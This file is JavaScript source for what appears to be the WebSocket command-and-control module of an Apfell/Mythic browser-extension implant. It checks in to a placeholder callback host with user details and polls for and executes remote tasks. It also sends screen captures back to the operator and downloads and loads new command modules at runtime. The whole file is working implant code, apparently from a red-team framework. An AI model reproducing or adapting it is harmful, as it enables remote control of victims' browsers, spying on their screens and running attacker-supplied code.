//------------- Chrome Extension Websocket C2 mechanisms ---------------------------------
// Dictionary that holds outbound messages
var out = [];
let screencaptures = [];
let loads = [];
class customC2 extends baseC2{
    constructor(host, port, endpoint, interval){
        super(host, port, endpoint,interval);
        this.host = host;
        this.port = port;
        this.endpoint = endpoint;
        this.interval = interval;
        this.commands = {};
        this.server = `${this.host}:${this.port}/${this.endpoint}`;
    }

    getConfig() {
        return JSON.stringify({'server': this.server, 'interval':this.interval, 'commands': JSON.stringify(this.commands)});
    }

    checkIn() {
        const msg = {
            "action":"checkin",
            "os":hostos,
            "architecture": hostarch,
            "user":apfell.userinfo,
            "uuid":apfell.uuid,
            "host":apfell.userinfo + "'s chrome",
            "pid":0,
            "ip":'127.0.0.1',
        };

        let checkin = JSON.stringify(msg);
        let checkinpayload = apfell.uuid + checkin;

        const meta = {
            "client": true,
            "data": btoa(unescape(encodeURIComponent(checkinpayload))),
            "tag":"",
        };

        const encmsg = JSON.stringify(meta);
        connection.send(encmsg);
        //console.log('Sent initial checkin');
    }

    postResponse(){
        if (out.length > 0){
            // Pop and send a message to the controller
            while (out.length > 0) {
                const msg = out.shift();
                const meta = {
                    "client":true,
                    "data": msg,
                    "tag":""
                };
                let final = JSON.stringify(meta);
                connection.send(final);
            }
        }
    }
}

//------------- INSTANTIATE OUR C2 CLASS BELOW HERE IN MAIN CODE-----------------------
const C2 = new customC2('callback_host',  callback_port, 'ENDPOINT_REPLACE', callback_interval);
const connection  = new WebSocket(`${C2.server}`);

function chunkArray(array, size) {
    if(array.length <= size){
        return [array];
    }

    return [array.slice(0,size), ...chunkArray(array.slice(size), size)];
}

function c2loop() {
    C2.postResponse();
    if (apfell.apfellid.length !== 0) {
        let request = {'action':'get_tasking', 'tasking_size': -1, 'delegates':[]};
        let msg = JSON.stringify(request);
        let final = apfell.apfellid + msg;
        let encfinal = btoa(unescape(encodeURIComponent(final)));
        out.push(encfinal);
    } else {
        //console.log('Apfell id not set for tasking ' + apfell.apfellid);
    }
}

var mainloop = setInterval(c2loop, C2.interval * 1000);

connection.onopen = function () {
    C2.checkIn();
};

connection.onclose = function () {
    // Do Nothing
};

connection.onerror = function () {
    // Do Nothing
};

connection.onmessage = function (e) {
    const rawmsg = JSON.parse(e.data);
    const decoded = atob(rawmsg.data);
    const messagenouuid = decoded.slice(36, decoded.length);

    const message = JSON.parse(messagenouuid);
    switch (message.action) {
        case 'checkin': {
            // callback check in
            if(message.id !== undefined){
                apfell.apfellid = message.id;
            }else{
                C2.checkIn();
            }
            break;
        }
        case 'get_tasking' : {
            // handle an apfell message

            for (let index = 0; index < message.tasks.length; index++) {
                const task = message.tasks[index];

                try {
                    commands_dict[task.command](task);
                } catch (error) {
                    let response = {'task_id':task.id, 'completed':false, 'status':'error', 'error':'error processing task for id ' + task.id + '\n' + error.toString()};
                    let outer_response = {'action':'post_response','responses':[response], 'delegates':[]};
                    let msg = btoa(unescape(encodeURIComponent(apfell.apfellid + JSON.stringify(outer_response))));
                    out.push(msg);
                    //console.log("Error executing task: " + error.toString());
                }
            }

            break;
        }
        case 'post_response' : {
            for (let index = 0; index < message.responses.length; index++) {
                let response = message.responses[index];
                
                // check for screencaptures 
                if (screencaptures.length > 0) {
                    for (let i = 0; i < screencaptures.length; i++) {
                        const capture = screencaptures[i];
                        let equal = response.task_id.localeCompare(capture.task_id);
                        if (equal === 0) {
                            // TODO: chunk the screencapture data
                            let raw = capture.image;

                            let resp = {
                                'chunk_num': 1,
                                'file_id': response.file_id,
                                'chunk_data': raw,
                                'task_id': capture.task_id,
                            };

                            let outer_response = {
                                'action':'post_response',
                                'responses':[resp],
                                'delegates':[]
                            };

                            let enc = JSON.stringify(outer_response);
                            let final = apfell.apfellid + enc;
                            let msg = btoa(unescape(encodeURIComponent(final)));
                            out.push(msg);

                            response = {
                                'task_id':response.task_id,
                                'user_output':'screencapture complete',
                                'complete':true
                            };
                            
                            outer_response = {
                                'action':'post_response',
                                'responses':[response],
                                'delegates':[]
                            };

                            enc = JSON.stringify(outer_response);
                            final = apfell.apfellid + enc;
                            msg = btoa(unescape(encodeURIComponent(final)));
                            out.push(msg);

                            screencaptures[i] = {};
                            if (screencaptures.length === 1 ) {
                                screencaptures = [];
                            }
                        }
                    }
                }
            }

            break;
        }
        case 'upload' : {
            // check for load command responses
            
            if (loads.length > 0) {
                for (let j = 0; j < loads.length; j++) {
                    let equal = message.file_id.localeCompare(loads[j].file_id);
                    if (equal === 0) {
                        let load = loads[j];
                        if (message.chunk_num < message.total_chunks) {
                            let raw = atob(message.chunk_data);
                            load.data.push(...raw);
                            loads[j] = load;
                            let resp = {'action':'upload','chunk_size': 1024000, 'chunk_num':(message.chunk_num + 1), 'file_id':load.file_id, 'full_path':''};
                            let encodedResponse = JSON.stringify(resp);
                            let final = apfell.apfellid + encodedResponse;
                            let msg = btoa(unescape(encodeURIComponent(final)));
                            out.push(msg);
                        } else if (message.chunk_num === message.total_chunks) {
                            let raw = atob(message.chunk_data);
                            load.data.push(...raw);
                            let new_dict = default_load(load.data.join(""));
                            commands_dict = Object.assign({}, commands_dict, new_dict);
                            //console.log(Object.values(commands_dict));
                            C2.commands = Object.keys(commands_dict);
                            let response = {'task_id':load.task_id, 'user_output': load.name + " loaded", "completed":true};
                            let outer_response = {'action':'post_response', 'responses':[response], 'delegates':[]};
                            let enc = JSON.stringify(outer_response);
                            let final = apfell.apfellid + enc;
                            let msg = btoa(unescape(encodeURIComponent(final)));
                            loads[j] = {};
                            out.push(msg);
                        }
                    }  
                }
            }
        }
    }
};